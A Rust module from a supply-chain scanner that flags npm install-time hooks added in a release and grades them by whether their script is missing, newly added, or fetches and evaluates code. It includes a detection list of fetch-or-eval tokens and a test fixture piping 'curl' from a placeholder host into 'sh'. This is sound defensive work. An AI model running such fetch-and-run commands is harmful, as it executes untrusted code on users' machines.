//! Install-time hooks a release brings in.
//!
//! An npm `preinstall`, `install` or `postinstall` script runs on every
//! machine that installs the package, before anyone has used it. A release
//! that starts running one has given itself code execution at install time —
//! the most common way a compromised package executes — and a patch release
//! has no business doing that. The manifest's own facts say so, whatever any
//! trait makes of the script.
//!
//! The hook's shape decides how far it goes:
//!
//! * its target script is not in the package — a staged or broken attack;
//! * its target arrives new in the same release — a dropper and its trigger;
//! * its command fetches or evaluates code itself.

use cleave::types::{DiffReportV1, FileStatus};

use crate::Severity;
use crate::member::MemberPath;
use crate::version::{Bump, Promise};

/// The npm lifecycle scripts that run on install. `prepare` is left out: it
/// runs for git installs and local development, not from the registry.
const HOOKS: &[&str] = &["preinstall", "install", "postinstall"];

/// Extensions of a script or binary a hook can run.
const RUNNABLE: &[&str] = &[
    "js", "cjs", "mjs", "ts", "sh", "py", "ps1", "bat", "cmd", "exe", "dll",
];

/// Command text that fetches or evaluates code without a file to read.
const FETCH_OR_EVAL: &[&str] = &[
    "curl ",
    "wget ",
    "http://",
    "https://",
    "node -e",
    "node --eval",
    "eval ",
    "base64",
    "powershell",
    "iex ",
    "| sh",
    "| bash",
    "|sh",
    "|bash",
];

/// What makes a hook worse than merely new.
#[derive(Clone, Copy, Debug, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum Shape {
    /// A new hook running a file the package already shipped.
    Plain,
    /// The hook runs a file the package does not contain.
    MissingTarget,
    /// The hook runs a file new in this same release.
    NewTarget,
    /// The command fetches or evaluates code itself.
    FetchesOrEvaluates,
}

/// An install-time hook a release added, or re-pointed at code an attack
/// would bring.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize)]
pub(crate) struct InstallHook {
    pub severity: Severity,
    pub shape: Shape,
    /// `preinstall`, `install` or `postinstall`.
    pub hook: String,
    /// The command, neutralized for display: the artifact chose it.
    pub command: String,
    /// The manifest declaring it, by its artifact-relative path.
    pub manifest: String,
}

impl InstallHook {
    /// The reason a reader needs first.
    pub(crate) fn describe(&self) -> String {
        let why = match self.shape {
            Shape::Plain => "",
            Shape::MissingTarget => " (its script is missing from the package)",
            Shape::NewTarget => " (its script is new in this release)",
            Shape::FetchesOrEvaluates => " (it fetches or evaluates code)",
        };
        format!("adds a {} hook: `{}`{why}", self.hook, self.command)
    }
}

/// The gravest install-time hook `diff` brings in, judged against `bump`.
pub(super) fn found(diff: &DiffReportV1, bump: Option<Bump>) -> Option<InstallHook> {
    let promise = bump.map_or(Promise::Nothing, |b| b.kind.promise());
    diff.files
        .iter()
        .filter_map(|file| Some((file, file.scopes.kv.as_ref()?)))
        .flat_map(|(file, kv)| {
            let added = kv.added.iter().map(|k| (k, true));
            let changed = kv
                .changed
                .iter()
                .filter(|c| c.old.value != c.new.value)
                .map(|c| (&c.new, false));
            added.chain(changed).filter_map(move |(k, new)| {
                let hook = k.path.strip_prefix("npm.scripts.")?;
                let command = k.value.as_str()?;
                if !HOOKS.contains(&hook) {
                    return None;
                }
                let shape = shape(command, &file.path, diff);
                // A package that already ran code at install time gains
                // nothing by pointing its hook at code it always shipped —
                // that is also how a cleanup restores the original hook. A
                // re-pointed hook counts only when its new shape is one an
                // attack takes.
                if !new && shape == Shape::Plain {
                    return None;
                }
                Some(InstallHook {
                    severity: severity(promise, shape),
                    shape,
                    hook: hook.to_owned(),
                    command: crate::printable(command),
                    manifest: super::shown_member_path(&file.path),
                })
            })
        })
        .inspect(|h| log::debug!("install hook: {} ({:?})", h.describe(), h.severity))
        .max_by_key(|h| h.severity)
}

fn severity(promise: Promise, shape: Shape) -> Severity {
    let shaped = shape != Shape::Plain;
    match (promise, shaped) {
        (Promise::Nothing, true) => Severity::Critical,
        (Promise::Nothing, false) | (Promise::Features, true) => Severity::High,
        (Promise::Features, false) | (Promise::Anything, true) => Severity::Medium,
        (Promise::Anything, false) => Severity::Low,
    }
}

/// How `command`, declared by the manifest at diff path `manifest`, reads.
fn shape(command: &str, manifest: &str, diff: &DiffReportV1) -> Shape {
    let lowered = command.to_ascii_lowercase();
    if FETCH_OR_EVAL.iter().any(|t| lowered.contains(t)) {
        return Shape::FetchesOrEvaluates;
    }
    // The manifest's directory, as diff paths spell it: `<root>!!package/`
    // inside an archive, `sub/` or nothing in a tree.
    let directory = manifest.rsplit_once('/').map_or("", |(dir, _)| dir);
    let prefix = if directory.is_empty() {
        String::new()
    } else {
        format!("{directory}/")
    };
    // Only an archive lists every member it holds, so only there does an
    // absent entry mean an absent file.
    let complete = MemberPath::new(manifest).is_member();
    let mut shape = Shape::Plain;
    for target in targets(command) {
        let path = format!("{prefix}{target}");
        match diff.files.iter().find(|f| f.path == path).map(|f| f.status) {
            Some(FileStatus::Added) => shape = Shape::NewTarget,
            None if complete => return Shape::MissingTarget,
            _ => {}
        }
    }
    shape
}

/// The local files `command` runs: tokens naming a runnable file by a
/// relative path.
fn targets(command: &str) -> impl Iterator<Item = &str> {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')'))
        .map(|token| token.trim_matches(|c| c == '"' || c == '\''))
        .map(|token| token.strip_prefix("./").unwrap_or(token))
        .filter(|token| {
            !token.starts_with('-')
                && !token.starts_with('/')
                && !token.contains("..")
                && token
                    .rsplit_once('.')
                    .is_some_and(|(_, ext)| RUNNABLE.contains(&ext))
        })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testkit::entry;
    use crate::version::BumpKind;
    use cleave::types::{KvChange, ScopeDiff};

    fn manifest(hook: &str, command: &str) -> cleave::types::FileDiffEntry {
        let mut file = entry(
            "<root>!!package/package.json",
            "package.json",
            FileStatus::Changed,
        );
        file.scopes.kv = Some(ScopeDiff {
            added: vec![KvChange {
                path: format!("npm.scripts.{hook}"),
                namespace: "npm".to_owned(),
                value: serde_json::Value::String(command.to_owned()),
            }],
            ..Default::default()
        });
        file
    }

    fn member(path: &str, status: FileStatus) -> cleave::types::FileDiffEntry {
        entry(format!("<root>!!package/{path}"), "javascript", status)
    }

    fn judged(
        files: Vec<cleave::types::FileDiffEntry>,
        bump: Option<Bump>,
    ) -> Option<(Shape, Severity)> {
        let diff = DiffReportV1 {
            old_root: "before.tgz".to_owned(),
            new_root: "after.tgz".to_owned(),
            summary: Default::default(),
            files,
            scopes: Default::default(),
        };
        found(&diff, bump).map(|h| (h.shape, h.severity))
    }

    #[test]
    fn a_patch_that_adds_an_install_hook_reads_by_its_shape() {
        let patch = Some(Bump::new(BumpKind::Patch, 1));
        // eslint-config-prettier 10.1.6: the hook shipped without its script.
        assert_eq!(
            judged(vec![manifest("install", "node install.js")], patch),
            Some((Shape::MissingTarget, Severity::Critical))
        );
        // 10.1.7: the script and its DLL arrived with the hook.
        assert_eq!(
            judged(
                vec![
                    manifest("install", "node install.js"),
                    member("install.js", FileStatus::Added),
                    member("node-gyp.dll", FileStatus::Added),
                ],
                patch
            ),
            Some((Shape::NewTarget, Severity::Critical))
        );
        // A hook running a script the package always had.
        assert_eq!(
            judged(
                vec![
                    manifest("postinstall", "node scripts/setup.js"),
                    member("scripts/setup.js", FileStatus::Unchanged),
                ],
                patch
            ),
            Some((Shape::Plain, Severity::High))
        );
        assert_eq!(
            judged(
                vec![manifest("preinstall", "curl -s https://x.example | sh")],
                patch
            ),
            Some((Shape::FetchesOrEvaluates, Severity::Critical))
        );
    }

    #[test]
    fn a_re_pointed_hook_counts_only_in_an_attack_shape() {
        let patch = Some(Bump::new(BumpKind::Patch, 1));
        let repointed = |command: &str| {
            let mut file = manifest("postinstall", command);
            let kv = file.scopes.kv.as_mut().expect("kv");
            let new = kv.added.remove(0);
            let mut old = new.clone();
            old.value = serde_json::Value::String("node ./bin/post-install || exit 0".to_owned());
            kv.changed.push(cleave::types::Changed { old, new });
            file
        };
        // nx: the release re-points its existing hook at a script new in it.
        assert_eq!(
            judged(
                vec![
                    repointed("node telemetry.js"),
                    member("telemetry.js", FileStatus::Added)
                ],
                patch
            ),
            Some((Shape::NewTarget, Severity::Critical))
        );
        // The cleanup points it back at a script the package always had.
        assert_eq!(
            judged(
                vec![
                    repointed("node scripts/post.js"),
                    member("scripts/post.js", FileStatus::Unchanged)
                ],
                patch
            ),
            None
        );
    }

    #[test]
    fn the_release_promise_lowers_the_bar() {
        let hook = || {
            vec![
                manifest("install", "node build.js"),
                member("build.js", FileStatus::Unchanged),
            ]
        };
        assert_eq!(
            judged(hook(), Some(Bump::new(BumpKind::Minor, 1))).map(|j| j.1),
            Some(Severity::Medium)
        );
        assert_eq!(
            judged(hook(), Some(Bump::new(BumpKind::Major, 1))).map(|j| j.1),
            Some(Severity::Low)
        );
    }

    #[test]
    fn other_scripts_are_not_install_hooks() {
        let patch = Some(Bump::new(BumpKind::Patch, 1));
        assert_eq!(
            judged(vec![manifest("prepare", "node install.js")], patch),
            None
        );
        assert_eq!(judged(vec![manifest("test", "mocha")], patch), None);
    }

    #[test]
    fn targets_are_relative_runnable_files() {
        let found: Vec<_> = targets("node ./install.js --flag && sh \"run.sh\"; node -v").collect();
        assert_eq!(found, ["install.js", "run.sh"]);
        assert_eq!(targets("node ../../etc/x.js /abs/y.js").count(), 0);
        assert_eq!(targets("node-gyp rebuild").count(), 0);
    }
}
